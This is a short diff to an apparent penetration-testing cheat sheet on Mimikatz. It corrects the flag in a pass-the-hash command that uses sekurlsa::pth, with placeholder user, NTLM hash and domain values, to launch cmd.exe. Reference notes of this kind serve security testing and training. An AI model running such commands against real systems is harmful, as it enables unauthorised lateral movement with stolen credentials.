@@ -20,6 +20,6 @@ Pre-built binaries available in the git repo: https://github.com/gentilkiwi/mimi
 ### Pass-the-Hash
 Using the `sekurlsa::pth` module we can perform a pass-the-hash attack. It starts a process using the user's hash.
 ```cmd
-C:\> mimikatz.exe privilege::debug "sekurlsa::pth /usr:<user> /NTLM:<hash> /domain:<AD_domain> /run:cmd.exe" exit
+C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /NTLM:<hash> /domain:<AD_domain> /run:cmd.exe" exit
 ```
 > We can specify any program in the `/run:` flag to launch any program but a shell is often most useful.
